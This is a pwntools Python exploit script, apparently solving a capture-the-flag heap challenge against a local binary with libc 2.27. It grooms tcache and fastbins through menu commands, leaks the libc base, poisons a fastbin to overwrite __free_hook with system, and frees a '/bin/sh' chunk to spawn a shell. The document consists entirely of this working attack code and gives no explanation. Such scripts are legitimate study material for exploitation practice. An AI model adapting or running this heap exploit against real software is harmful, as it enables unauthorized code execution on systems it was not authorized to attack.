from pwn import *
context.log_level = "debug"
context.arch ='amd64'
context.terminal = ['tmux', 'splitw', '-h']

p = process("./vuln")# p = remote("127.0.0.1", 9999)
elf = ELF("./vuln")
libc = ELF("./libc-2.27.so")

def bpt():
    if not args.REMOTE:
        gdb.attach(p)
    pause()

def add(index, size, content):
    p.sendlineafter(b"Your choice:", b'1')
    p.sendlineafter(b"Index: ", str(index).encode())
    p.sendlineafter(b"Size: ", str(size).encode())
    p.sendafter(b"Content: ", content)
    
def delete(index):
    p.sendlineafter(b"Your choice:", b'3')
    p.sendlineafter(b"Index: ", str(index).encode())
    
def show(index):
    p.sendlineafter(b"Your choice:", b'2')
    p.sendlineafter(b"Index: ", str(index).encode())

add(0, 0xF8, b'a')
add(1, 0x68, b'a')

for i in range(2, 10): #2-9
    add(i, 0xF8, b'a')
    
add(12, 0x68, b'a')

for i in range(3, 10): #3-9
    delete(i)
    
delete(0)
delete(1)
add(1,0x68, b'a' * 0x60 + p64(0x170))
bpt()
delete(2)
add(0, 0x78, b'a')
add(2, 0x78, b'a')
show(1)
libc_base = u64(p.recv(6).ljust(8, b'\x00')) - libc.sym["__malloc_hook"] - 0x10 -0x60
log.success("libc_base={}".format(hex(libc_base)))
__free_hook = libc_base + libc.sym["__free_hook"]
system = libc_base + libc.sym["system"]
add(3, 0x68, b'a')

for i in range(4,11):
    add(i,0x68,b'a')
    
for i in range(4,11):
    delete(i)
    
delete(3)
delete(12)
delete(1)

for i in range(4,11):
    add(i,0x68,b'a')

add(1,0x68,p64(__free_hook))
add(3, 0x68, b'/bin/sh\x00')
add(13, 0x68, b'/bin/sh\x00')
add(12, 0x68, p64(system))
delete(3)
p.interactive()